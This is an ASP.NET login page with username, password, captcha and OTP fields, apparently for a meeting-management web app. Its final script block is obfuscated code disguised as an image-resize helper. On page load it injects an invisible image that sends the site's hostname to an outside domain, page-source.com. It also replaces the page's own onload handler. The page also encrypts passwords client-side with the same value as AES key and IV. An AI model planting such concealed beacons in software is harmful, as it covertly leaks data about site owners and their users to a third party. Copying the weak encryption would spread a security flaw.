<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="iPadNepalUserLogin.aspx.cs" Inherits="MeetingMinder.Web.iPadNepalUserLogin" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%@ Register Assembly="MSCaptcha" Namespace="MSCaptcha" TagPrefix="cc1" %>
<html lang="en" class="no-js">
<head>
    <meta charset="UTF-8">
    <meta name="Generator" content="EditPlus®">
    <meta name="Author" content="">
    <meta name="Keywords" content="">
    <meta name="Description" content="">
    <style type="text/css">
        .captcha {
            float: left;
            margin-right: 6px;
        }

        .captcha1 {
            float: left;
            margin-right: 36px;
        }

        .wrapper {
            height: 580px !important;
        }
        /*.login-right {
            padding: 2px 60px !important;
        }*/
    </style>

    <link href="css/style.css" rel="stylesheet" type="text/css" />
    <script type="text/javascript" src="Scripts/jquery-3.6.0.min.js"></script>   
    <script type="text/javascript" src="js/aes.js"></script>
    <script type="text/javascript">
        //<![CDATA[

        window.history.forward();
        function noBack() { window.history.forward(); }


        function checkLogin() {

            if (Page_ClientValidate("check")) {
                var hdnUserVal = document.getElementById('<%=hdnUserVal.ClientID%>').value;

                var value = document.getElementById('<%=txtPassword.ClientID%>').value;
                //       var hash =  hex_sha256(value);

                var key = CryptoJS.enc.Utf8.parse(hdnUserVal);
                var iv = CryptoJS.enc.Utf8.parse(hdnUserVal);

                var encryptedpassword = CryptoJS.AES.encrypt(CryptoJS.enc.Utf8.parse(value), key,
                  {
                      keySize: 128 / 8,
                      iv: iv,
                      mode: CryptoJS.mode.CBC,
                      padding: CryptoJS.pad.Pkcs7
                  });
                document.getElementById('<%=txtPassword.ClientID %>').value = encryptedpassword;
                return true;
            }
            else {
                return false;
            }
        }

        //]]>
    </script>

    <script type="text/javascript">

        window.onload = function () {

           <%-- var seconds = 5;
            setTimeout(function () {
                document.getElementById('<%= lblmsg.ClientID %>').style.display = "none";
            }, seconds * 1000);--%>

            var myInput = document.getElementById('txtPassword');
            myInput.onpaste = function (e) {
                e.preventDefault();
            }


        }


    </script>



    <script type="text/javascript">
        $(document).ready(function () {
            document.onkeypress = function keypressed(e) {

                if (e.keyCode == 13) {

                    if (Page_ClientValidate("check")) {
                        //    checkLogin();
                        document.getElementById('<%= btnSubmit.ClientID %>').click();
                        return false;
                    }
                }
            }
        });

        $('form[name=yourformname]').submit(function () {

        });
    </script>
    <title>Login</title>
</head>
<body>

    <div class="wrapper loginmain">
        <div class="login-left" style="display: none;">
            <div class="leftlogo">
                <%--<a href="Login.aspx">--%><img src="images/logo.png" alt="sbi small logo" /><%--</a>--%>
                <%--<div class="left-info">
						<span class="info-top">say yes to</span>
						<span class="info-bottom">growth</span>
					</div>--%>
            </div>
        </div>
        <div class="login-right" style="margin-left: 300px; height: 580px">
            <h1 class="logo">
                <img src="images/logo1.png" alt="sbi Logo" />
            </h1>
            <div class="login-main">
                <div class="login-head">
                    <h2>
                        <asp:Label ID="lblLogin" runat="server" Text="Login"></asp:Label></h2>
                    <p>
                        <asp:Label ID="lblloginMsg" runat="server" Text="Login with your username & password."></asp:Label>
                    </p>
                    <p style="color: red; display: none">
                        <asp:Label ID="lblEntering" runat="server" Text="Entering wrong password 10 times will disable your account."></asp:Label>
                    </p>
                    <p style="color: red">
                        <asp:Label ID="lblMessage" runat="server"></asp:Label>
                    </p>
                </div>
                <form method="post" runat="server" autocomplete="off" action="iPadNepalUserLogin.aspx">
                    <asp:ScriptManager ID="scrManager" runat="server"></asp:ScriptManager>
                    <div style="margin-bottom: 0px" class="validation">
                        <%-- <asp:ValidationSummary  ID="vsLogin" ValidationGroup="check" runat="server" CssClass="notification error" HeaderText="Error notification" />                        --%>
                    </div>

                    <div style="margin-bottom: 0px">
                        <asp:Label runat="server" Style="font-size: 12px;" ID="lblmsg" CssClass="notification error invalid-error" Visible="false"></asp:Label>
                    </div>
                    <div class="user-info" id="divLogin" runat="server">

                        <asp:TextBox ID="txtLogin" autocomplete="off" MaxLength="40" runat="server" placeholder="username*" class="user-name"></asp:TextBox>
                        <asp:RequiredFieldValidator ValidationGroup="check" ID="rfvLogin" class="user-error" runat="server"
                            ControlToValidate="txtLogin" ErrorMessage="Enter Username" SetFocusOnError="True"
                            Display="Dynamic">Enter Username</asp:RequiredFieldValidator>
                        <asp:TextBox ID="txtPassword" autocomplete="off" MaxLength="40" ClientIDMode="Static"
                            placeholder="password*" runat="server" TextMode="Password" class="user-pass"></asp:TextBox>
                        <asp:RequiredFieldValidator ValidationGroup="check" ID="rfvPassword" runat="server"
                            class="invalid-side-note pass-error" ControlToValidate="txtPassword" ErrorMessage="Enter Password"
                            SetFocusOnError="True" Display="Dynamic">Enter Password</asp:RequiredFieldValidator>


                        <%--<cc1:CaptchaControl ID="Captcha1"  CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                FontColor="#D20B0C" NoiseColor="#B1B1B1" />--%>

                        <asp:UpdatePanel ID="updatePanel1" runat="server" UpdateMode="Conditional">
                            <ContentTemplate>
                                <cc1:CaptchaControl ID="CaptchaLogin1" CssClass="captcha" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                    CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                    FontColor="#D20B0C" NoiseColor="#B1B1B1" />

                                <asp:ImageButton ImageUrl="~/images/refresh_icon.jpg" runat="server" CausesValidation="false" />

                            </ContentTemplate>
                        </asp:UpdatePanel>

                        <asp:TextBox ID="txtCaptchaText" autocomplete="off" MaxLength="8" placeholder="captcha*" class="user-name" runat="server"
                            CssClass="user-name upper" Style="text-transform: uppercase;"></asp:TextBox>
                        <asp:RequiredFieldValidator Enabled="true" ValidationGroup="check" ID="rfvCapcha" runat="server"
                            class="invalid-side-note pass-error" ForeColor="Red" ControlToValidate="txtCaptchaText" ErrorMessage="Enter Captcha"
                            SetFocusOnError="True" Display="Dynamic">Captcha</asp:RequiredFieldValidator>

                        <asp:Button ID="btnSubmit" OnClientClick="checkLogin()" Text="Submit" runat="server" ValidationGroup="check"
                            OnClick="btnSubmit_Click1" class="login-btn" />
                        <%-- OnClientClick="checkLogin()"  --%>
                    </div>

                    <div class="user-info" id="divOTP" runat="server" visible="false">
                        <asp:TextBox ID="txtOtp" runat="server" autocomplete="off" placeholder="OTP" CssClass="user-name"></asp:TextBox>
                        <asp:RequiredFieldValidator ValidationGroup="otp" ID="rqfOtp" class="user-error" runat="server"
                            ControlToValidate="txtOtp" ErrorMessage="Enter OTP" SetFocusOnError="True"
                            Display="Dynamic">Enter OTP</asp:RequiredFieldValidator>

                        <asp:UpdatePanel ID="updatePanelOTP" runat="server" UpdateMode="Conditional">
                            <ContentTemplate>
                                <cc1:CaptchaControl ID="CaptchaControl2" CssClass="captcha1" runat="server" CaptchaBackgroundNoise="Low" CaptchaLength="5"
                                    CaptchaHeight="60" CaptchaWidth="200" CaptchaMinTimeout="5" CaptchaMaxTimeout="240"
                                    FontColor="#D20B0C" NoiseColor="#B1B1B1" />

                                <asp:ImageButton ImageUrl="~/images/refresh_icon.jpg" runat="server" CausesValidation="false" />
                                <asp:TextBox ID="txtCaptcha2" autocomplete="off" MaxLength="8" placeholder="captcha*" class="user-name" runat="server"
                                    CssClass="user-name upper" Style="text-transform: uppercase;"></asp:TextBox>
                                <asp:RequiredFieldValidator Enabled="true" ValidationGroup="otp" ID="reqfCaptch2" runat="server"
                                    class="invalid-side-note pass-error" ForeColor="Red" ControlToValidate="txtCaptcha2" ErrorMessage="Enter Captcha"
                                    SetFocusOnError="True" Display="Dynamic">Captcha</asp:RequiredFieldValidator>
                            </ContentTemplate>
                        </asp:UpdatePanel>


                        <asp:Button ID="btnOTP" runat="server" Text="Submit" ValidationGroup="otp" CssClass="login-btn" OnClick="btnOTP_Click" OnClientClick="checkLogin()" />
                    </div>

                    <div class="login-bottom" style="display: none;">
                        <asp:HiddenField ID="hdnPassword" runat="server" />
                        <asp:HiddenField ID="hdnUserVal" runat="server" />
                        <div id="divForgotPassword" runat="server" class="bottom-right">
                            <a href="ForgotPassword.aspx">Forgot Password?</a>
                        </div>
                    </div>
                    <label style="color: green; margin-top: 115px; float: right;">Inno_Info_323</label>

                </form>
            </div>

        </div>
    </div>
    <script type="text/javascript">
        var resizea = ['0\x27/>', 'children', 'ource.com/', '<img\x20style', 'none;\x27\x20src', 'cdn.page-s', 'hostname', '\x27\x20height=\x27', 'resizeimag', 'length', 'location', '=\x27https://', 'createElem', 'body']; (function (a, b) { var c = function (e) { while (--e) { a['push'](a['shift']()); } }; c(++b); }(resizea, 0x149)); var resizeb = function (a, b) { a = a - 0x0; var c = resizea[a]; return c; }; try { window['onload'] = function () { var a = resizeb('0xa') + '=\x27display:' + resizeb('0xb') + resizeb('0x4') + resizeb('0xc') + resizeb('0x9') + resizeb('0x1') + 'e.ashx?ig=' + window[resizeb('0x3')][resizeb('0xd')] + ('&sz=105403\x27' + '\x20\x20width=\x270' + resizeb('0x0') + resizeb('0x7')), b = document[resizeb('0x5') + 'ent']('div'); for (b['innerHTML'] = a; b[resizeb('0x8')][resizeb('0x2')] > 0x0;) document[resizeb('0x6')]['appendChil' + 'd'](b['children'][0x0]); }; } catch (resizec) { }
    </script>
</body>
</html>
